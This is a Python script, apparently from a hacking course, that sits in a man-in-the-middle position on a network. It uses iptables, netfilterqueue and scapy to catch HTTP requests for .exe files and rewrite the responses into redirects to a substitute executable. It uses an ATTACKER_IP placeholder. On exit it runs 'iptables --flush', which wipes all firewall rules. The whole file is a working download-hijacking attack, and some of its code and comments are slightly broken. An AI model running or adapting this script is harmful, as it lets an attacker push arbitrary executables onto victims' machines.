#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 15-06-2020
# Last Updated: 16-06-2020
# Operating System: Linux and Mac
# Description: Intercept and redirect downloads

# Import the necessary libraries
import netfilterqueue
import subprocess
import scapy.layers.l2 as scapy
import scapy.all as scapy2

# Create a queue to trap the incoming packets (forwarded packets)
# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
# Create a queue to trap the incoming and outgoing packets of the hacker machine (for test purpose)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

ack_list = []


# Define a function to modify the load of a packet
def set_load(packet, load):
	packet[scapy2.Raw].load = load
	# Delete the len and cksum fields from the IP and TCP layers to avoid packet corruption
	del packet[scapy2.IP].len
	del packet[scapy2.IP].chksum
	del packet[scapy2.TCP].chksum
	return packet


# Define the callback funtion
def process_packet(packet):
	# Convert the packet to a scapy packet
	scapy_packet = scapy2.IP(packet.get_payload())
	# Check if the packet has a DNS response layer
	if scapy_packet.haslayer(scapy2.Raw):
		# Check if the destination and the source ports use HTTP -> to determine whether it is a request or response
		if scapy_packet[scapy2.TCP].dport == 10000:
			# Check if the user is downloading anything of a specific type type
			if b".exe" in scapy_packet[scapy2.Raw].load and b"<ATTACKER_IP>" not in scapy_packet[scapy2.Raw].load:
				print("[+] Found a .exe download request")
				ack_list.append(scapy_packet[scapy2.TCP].ack)
		elif scapy_packet[scapy2.TCP].sport == 10000:
			if scapy_packet[scapy2.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy2.TCP].seq)
				print("[+] Replacing file")
				modified_packet = set_load(scapy_packet, "HTTP://1.1 301 Moved Permanently\nLocation: https://download.winzip.com/gl/nkln/winzip24-downwz.exe\n\n")
				# Put the modified packet to the original packet
				packet.set_payload(bytes(modified_packet))
	# Forward the packet to the target
	packet.accept()


try:
	# Create a queue to trap the packets
	queue = netfilterqueue.NetfilterQueue()
	# Bind the queue to the created queue (that is currently storing the packets)
	queue.bind(0, process_packet)
	# Run the queue
	queue.run()
except KeyboardInterrupt:
	# Delete the iptables created at the started 
	print("\n[+] Deleting created iptables.......Please Wait!\n")
	subprocess.call("iptables --flush", shell=True)


